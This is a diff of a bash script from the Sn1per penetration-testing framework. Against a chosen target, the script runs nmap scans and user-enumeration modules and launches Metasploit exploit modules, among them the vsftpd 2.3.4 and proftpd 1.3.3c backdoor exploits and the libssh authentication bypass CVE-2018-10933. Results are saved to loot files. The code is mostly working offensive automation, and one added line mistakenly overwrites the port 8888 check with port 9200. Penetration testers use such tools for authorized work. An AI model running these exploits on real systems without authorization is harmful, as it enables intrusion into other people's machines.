@@ -13,7 +13,7 @@ if [ "$REPORT" = "1" ]; then
   if [ "$RECON" = "1" ]; then
     args="$args -re"
   fi
-  if [ "MODE" = "port" ]; then
+  if [ "$MODE" = "port" ]; then
     args="$args -m port"
   fi
   if [ ! -z "$PORT" ]; then
@@ -36,7 +36,7 @@ echo -e "$OKRED /____/_/ /_/___/ .___/\___/_/     $RESET"
 echo -e "$OKRED               /_/                 $RESET"
 echo -e "$RESET"
 echo -e "$OKORANGE + -- --=[https://xerosecurity.com"
-echo -e "$OKORANGE + -- --=[sniper v$VER by @xer0dayz"
+echo -e "$OKORANGE + -- --=[Sn1per v$VER by @xer0dayz"
 echo -e "$RESET"
 
 if [ ! -z $WORKSPACE ]; then
@@ -50,6 +50,7 @@ echo -e "$OKRED GATHERING DNS INFO $RESET"
 echo -e "${OKGREEN}====================================================================================${RESET}"
 dig all +short $TARGET > $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
 dig all +short -x $TARGET >> $LOOT_DIR/nmap/dns-$TARGET.txt 2> /dev/null
+dig A $TARGET 2> /dev/null >> $LOOT_DIR/ips/ips-all-unsorted.txt 2> /dev/null
 dnsenum $TARGET 2> /dev/null
 mv -f *_ips.txt $LOOT_DIR/domains/ 2>/dev/null
 
@@ -70,12 +71,12 @@ echo ""
 echo -e "${OKGREEN}====================================================================================${RESET}"
 echo -e "$OKRED RUNNING TCP PORT SCAN $RESET"
 echo -e "${OKGREEN}====================================================================================${RESET}"
-if [ -z "$PORT" ]; then
-  nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
-elif [ "$MODE" == "web" ]; then
+if [ "$MODE" == "web" ]; then
   nmap -sV -T5 -Pn -p 80,443  --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
-else
+elif [ ! -z "$PORT" ]; then 
   nmap -sS -T5 -Pn -p $PORT --open $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
+else
+  nmap -sS -T5 --open -Pn -p $DEFAULT_PORTS $TARGET -oX $LOOT_DIR/nmap/nmap-$TARGET.xml | tee $LOOT_DIR/nmap/nmap-$TARGET.txt
 fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED RUNNING UDP PORT SCAN $RESET"
@@ -135,6 +136,7 @@ port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_8888=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
@@ -155,16 +157,38 @@ if [ -z "$port_21" ];
 then
   echo -e "$OKRED + -- --=[Port 21 closed... skipping.$RESET"
 else
-  echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET 
-  if [ $METASPLOIT_EXPLOIT = "1" ]; then
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "$OKORANGE + -- --=[Port 21 opened... running tests...$RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; use auxiliary/scanner/ftp/anonymous; run; use exploit/unix/ftp/vsftpd_234_backdoor; run; use unix/ftp/proftpd_133c_backdoor; run; exit;"
+    nmap -A -sV -Pn -sC -T5 -p 21 --script=ftp-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port21.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT FTP VERSION SCANNER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/ftp_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw > $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port21-ftp_version.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT ANONYMOUS FTP SCANNER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use auxiliary/scanner/ftp/anonymous; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw > $LOOT_DIR/output/msf-$TARGET-port21-anonymous.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port21-anonymous.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use exploit/unix/ftp/vsftpd_234_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port21-vsftpd_234_backdoor.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING PROFTPD 1.3.3C BACKDOOR EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; use unix/ftp/proftpd_133c_backdoor; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw > $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port21-proftpd_133c_backdoor.raw 2> /dev/null
   fi
 fi
 
@@ -174,34 +198,48 @@ then
 else
   echo -e "$OKORANGE + -- --=[Port 22 opened... running tests...$RESET"
   if [ $DISTRO == "blackarch" ]; then
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING SSH AUDIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    /bin/ssh-audit $TARGET:22
+    if [ $SSH_AUDIT = "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      /bin/ssh-audit $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
+    fi
   else
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    echo -e "$OKRED RUNNING SSH AUDIT $RESET"
-    echo -e "${OKGREEN}====================================================================================${RESET}"
-    cd $PLUGINS_DIR/ssh-audit
-    python ssh-audit.py $TARGET:22
+    if [ $SSH_AUDIT = "1" ]; then
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING SSH AUDIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      cd $PLUGINS_DIR/ssh-audit
+      python ssh-audit.py $TARGET:22 | tee $LOOT_DIR/output/sshaudit-$TARGET-port22.txt
+    fi
   fi
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING OPENSSH USER ENUM EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  python3 $PLUGINS_DIR/ssh-enum/sshUsernameEnumExploit.py --port 22 --userList /usr/share/brutex/wordlists/simple-users.txt $TARGET | grep 'is a valid'
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING LIBSSH AUTH BYPASS EXPLOIT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  python $PLUGINS_DIR/libssh-scanner/libsshscan.py -p 22 -a $TARGET
   cd $INSTALL_DIR
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use auxiliary/scanner/ssh/ssh_version; run; use scanner/ssh/ssh_enumusers; run; use scanner/ssh/ssh_identify_pubkeys; run; use scanner/ssh/ssh_version; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -sC -T5 -p 22 --script=ssh-* $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port22.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SSH VERSION SCANNER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_version.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING OPENSSH USER ENUM SCANNER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg USER_FILE "$USER_FILE"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/ssh_enumusers; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw > $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port22-ssh_enumusers.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING LIBSSH AUTH BYPASS EXPLOIT CVE-2018-10933 $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use scanner/ssh/libssh_auth_bypass; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw > $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port22-libssh_auth_bypass.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_23" ];
@@ -209,20 +247,20 @@ then
   echo -e "$OKRED + -- --=[Port 23 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 23 opened... running tests...$RESET"
-  echo ""
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING CISCO TORCH $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
-  cisco-torch -A $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=telnet* -p 23 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port23.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use scanner/telnet/lantronix_telnet_password; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; use scanner/telnet/lantronix_telnet_version; run; use scanner/telnet/telnet_encrypt_overflow; run; use scanner/telnet/telnet_ruggedcom; run; use scanner/telnet/telnet_version; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port23.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port23.raw > $LOOT_DIR/output/msf-$TARGET-port23.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port23.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_25" ];
@@ -230,18 +268,20 @@ then
   echo -e "$OKRED + -- --=[Port 25 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 25 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING SMTP USER ENUM SCRIPT $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING METASPLOIT MODULES $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;"
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=smtp* -p 25 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port25.txt
+  fi
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING SMTP USER ENUM $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use scanner/smtp/smtp_enum; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw > $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port25-smtp_enum.raw 2> /dev/null
+  fi
 fi
 
 if [ -z "$port_53" ];
@@ -249,10 +289,12 @@ then
   echo -e "$OKRED + -- --=[Port 53 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 53 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=dns* -p 53 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=dns* -p 53 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port53.txt
+  fi
 fi
 
 if [ -z "$port_67" ];
@@ -260,10 +302,12 @@ then
   echo -e "$OKRED + -- --=[Port 67 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 67 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 67 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 67 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port67.txt
+  fi
 fi
 
 if [ -z "$port_68" ];
@@ -271,10 +315,12 @@ then
   echo -e "$OKRED + -- --=[Port 68 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 68 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 68 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sU -sV -Pn -T5 --script=dhcp* -p 68 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port68.txt
+  fi
 fi
 
 if [ -z "$port_69" ];
@@ -282,10 +328,12 @@ then
   echo -e "$OKRED + -- --=[Port 69 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 69 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sU -sV -Pn -T5 --script=tftp* -p 69 $TARGET
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sU -sV -Pn -T5 --script=tftp* -p 69 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port69.txt
+  fi
 fi
 
 if [ -z "$port_79" ];
@@ -293,14 +341,12 @@ then
   echo -e "$OKRED + -- --=[Port 79 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 79 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED RUNNING FINGER TOOL $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  bin/fingertool.sh $TARGET $USER_FILE
+  if [ "$NMAP_SCRIPTS" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    nmap -A -sV -Pn -T5 --script=finger* -p 79 $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port79.txt
+  fi
 fi
 
 if [ -z "$port_80" ];
@@ -308,57 +354,67 @@ then
   echo -e "$OKRED + -- --=[Port 80 closed... skipping.$RESET"
 else
   echo -e "$OKORANGE + -- --=[Port 80 opened... running tests...$RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED CHECKING FOR WAF $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  wafw00f http://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-http 2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-http > $LOOT_DIR/web/waf-$TARGET-http.txt 2> /dev/null
-  echo ""
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED GATHERING HTTP INFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  whatweb -a 3 http://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-http  2> /dev/null
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-http > $LOOT_DIR/web/whatweb-$TARGET-http.txt 2> /dev/null
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED GATHERING SERVER INFO $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  python3 $PLUGINS_DIR/wig/wig.py -d -q -t 50 http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
-  sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
+  if [ "$WAFWOOF" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED CHECKING FOR WAF $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    wafw00f http://$TARGET | tee $LOOT_DIR/web/waf-$TARGET-http.raw 2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/waf-$TARGET-http.raw > $LOOT_DIR/web/waf-$TARGET-http.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/waf-$TARGET-http.raw 2> /dev/null
+    echo ""
+  fi
+  if [ "$WHATWEB" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING HTTP INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    whatweb -a 3 http://$TARGET | tee $LOOT_DIR/web/whatweb-$TARGET-http.raw  2> /dev/null
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/whatweb-$TARGET-http.raw > $LOOT_DIR/web/whatweb-$TARGET-http.txt 2> /dev/null
+    rm -f $LOOT_DIR/web/whatweb-$TARGET-http.raw 2> /dev/null
+  fi
+  if [ "$WIG" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING SERVER INFO $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    python3 $PLUGINS_DIR/wig/wig.py -d -q http://$TARGET | tee $LOOT_DIR/web/wig-$TARGET-http
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/web/wig-$TARGET-http > $LOOT_DIR/web/wig-$TARGET-http.txt 2> /dev/null
+  fi
   echo -e "${OKGREEN}====================================================================================${RESET}"
   echo -e "$OKRED CHECKING HTTP HEADERS $RESET"
   echo -e "${OKGREEN}====================================================================================${RESET}"
-  wget -qO- -T 1 --connect-timeout=3 --read-timeout=3 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
-  curl --connect-timeout 3 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED SAVING SCREENSHOTS $RESET"
-  echo -e "${OKGREEN}====================================================================================${RESET}"
-  echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port80.jpg"
-  if [ ${DISTRO} == "blackarch"  ]; then
-    /bin/CutyCapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=1000 2> /dev/null
-  else
-    cutycapt --url=http://$TARGET --out=$LOOT_DIR/screenshots/$TARGET-port80.jpg --insecure --max-wait=1000 2> /dev/null
+  wget -qO- -T 1 --connect-timeout=5 --read-timeout=5 --tries=1 http://$TARGET |  perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' >> $LOOT_DIR/web/title-http-$TARGET.txt 2> /dev/null
+  curl --connect-timeout 5 -I -s -R http://$TARGET | tee $LOOT_DIR/web/headers-http-$TARGET.txt 2> /dev/null
+  curl --connect-timeout 5 -I -s -R -L http://$TARGET | tee $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null
+  if [ "$WEBTECH" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED GATHERING WEB FINGERPRINT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    webtech -u http://$TARGET | grep \- | cut -d- -f2- | tee $LOOT_DIR/web/webtech-$TARGET-http.txt
   fi
-  
-  source $INSTALL_DIR/modes/normal_webporthttp.sh
-
-  if [ $SCAN_TYPE == "DOMAIN" ] && [ $OSINT == "1" ]; then
-    if [ $OSINT == "0" ]; then
-      echo -e "${OKGREEN}====================================================================================${RESET}"
-      echo -e "$OKRED SKIPPING GOOGLE HACKING QUERIES $RESET"
-      echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING META GENERATOR TAGS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | grep generator | cut -d\" -f4 2> /dev/null | tee $LOOT_DIR/web/webgenerator-http-$TARGET.txt 2> /dev/null
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING COMMENTS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  cat $LOOT_DIR/web/websource-http-$TARGET.txt 2> /dev/null | grep "<\!\-\-" 2> /dev/null | tee $LOOT_DIR/web/webcomments-http-$TARGET.txt 2> /dev/null
+  echo -e "${OKGREEN}====================================================================================${RESET}"
+  echo -e "$OKRED DISPLAYING SITE LINKS $RESET"
+  echo -e "${OKGREEN}====================================================================================${RESET}"
